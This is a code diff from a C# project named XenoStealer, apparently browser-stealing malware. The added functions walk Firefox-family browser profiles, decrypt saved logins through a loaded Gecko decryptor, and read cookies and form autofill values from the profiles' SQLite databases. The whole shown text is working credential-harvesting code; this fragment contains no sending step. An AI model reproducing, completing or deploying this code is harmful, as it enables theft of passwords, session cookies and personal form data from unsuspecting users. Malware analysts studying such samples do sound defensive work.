@@ -5,16 +5,136 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
+using static XenoStealer.DataExtractionStructs;
 
-namespace XenoStealer.DataExtraction.Browsers
+namespace XenoStealer
 {
     public static class Gecko
     {
 
+        public static DataExtractionStructs.GeckoBrowser[] GetAllInfo(GeckoBrowserOptions options) 
+        {
+            List<DataExtractionStructs.GeckoBrowser> browsers = new List<DataExtractionStructs.GeckoBrowser>();
 
+            bool ShouldGetLogins = (options & GeckoBrowserOptions.Logins) == GeckoBrowserOptions.Logins;
+            bool ShouldGetCookies = (options & GeckoBrowserOptions.Cookies) == GeckoBrowserOptions.Cookies;
+            bool ShouldGetAutofills = (options & GeckoBrowserOptions.Autofills) == GeckoBrowserOptions.Autofills;
+
+            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills) 
+            {
+                return new DataExtractionStructs.GeckoBrowser[0];
+            }
+
+            foreach (KeyValuePair<string, string> browserInfo in Configuration.GeckoBrowsers) 
+            {
+                List<DataExtractionStructs.GeckoProfile> profiles = new List<DataExtractionStructs.GeckoProfile>();
+
+                GeckoDecryptor decryptor = null;
+
+                bool GetBrowserLogins = ShouldGetLogins;
+
+                string browserName = browserInfo.Key;
+                string browserProfilesPath = browserInfo.Value;
+                string browserLibraryPath = Configuration.GeckoLibraryPaths[browserName];
+                if (!Directory.Exists(browserProfilesPath)) 
+                {
+                    continue;
+                }
+                if (GetBrowserLogins) 
+                {
+                    if (!Directory.Exists(browserProfilesPath))
+                    {
+                        GetBrowserLogins = false;
+                    }
+                    else 
+                    {
+                        decryptor = new GeckoDecryptor(browserLibraryPath);
+                        GetBrowserLogins = decryptor.Operational;
+                    }
+                }
+
+                foreach (string profilePath in Directory.GetDirectories(browserProfilesPath)) 
+                {
+                    string profileName = new DirectoryInfo(profilePath).Name;
+
+                    GeckoLogin[] logins = null;
+                    GeckoCookie[] cookies = null;
+                    GeckoAutoFill[] autofills = null;
+
+                    if (GetBrowserLogins) 
+                    {
+                        logins = GetLogins(profilePath, decryptor);
+                    }
+                    if (ShouldGetCookies) 
+                    {
+                        cookies = GetCookies(profilePath);
+                    }
+                    if (ShouldGetAutofills) 
+                    { 
+                        autofills = GetAutoFill(profilePath);
+                    }
+
+                    if (logins == null && cookies == null && autofills == null) 
+                    {
+                        continue;
+                    }
+
+                    profiles.Add(new GeckoProfile(logins, cookies, autofills, profileName));
+                    //if ()
+                }
+
+
+                decryptor?.Dispose();
+
+                browsers.Add(new GeckoBrowser(profiles.ToArray(), browserName));
+            }
+
+            return browsers.ToArray();
+        }
+
+        public static DataExtractionStructs.GeckoAutoFill[] GetAutoFill(string profilePath) 
+        {
+            List<DataExtractionStructs.GeckoAutoFill> autoFills = new List<DataExtractionStructs.GeckoAutoFill>();
+            string db_location = Path.Combine(profilePath, "formhistory.sqlite");
+            if (!File.Exists(db_location))
+            {
+                return null;
+            }
+
+            byte[] fileBytes = Utils.ForceReadFile(db_location);
+            if (fileBytes == null)
+            {
+                return null;
+            }
+
+            SqlLite3Parser parser;
+            try
+            {
+                parser = new SqlLite3Parser(fileBytes);
+            }
+            catch
+            {
+                return null;
+            }
+
+            if (!parser.ReadTable("moz_formhistory"))
+            {
+                return null;
+            }
+
+            for (int i = 0; i < parser.GetRowCount(); i++)
+            {
+                string name = parser.GetValue(i, "fieldname");
+                string value = parser.GetValue(i, "value");
+                if (name == null || value == null) continue;
+                autoFills.Add(new DataExtractionStructs.GeckoAutoFill(name, value));
+            }
+
+            return autoFills.ToArray();
+
+        }
         public static DataExtractionStructs.GeckoCookie[] GetCookies(string profilePath)
         {
-
             List<DataExtractionStructs.GeckoCookie> cookies = new List<DataExtractionStructs.GeckoCookie>();
 
             string db_location = Path.Combine(profilePath, "cookies.sqlite");
@@ -29,9 +149,9 @@ namespace XenoStealer.DataExtraction.Browsers
                 return null;
             }
 
-            SqlLite3Parser parser = null;
+            SqlLite3Parser parser;
             try 
-            { 
+            {
                 parser = new SqlLite3Parser(fileBytes);
             } 
             catch 
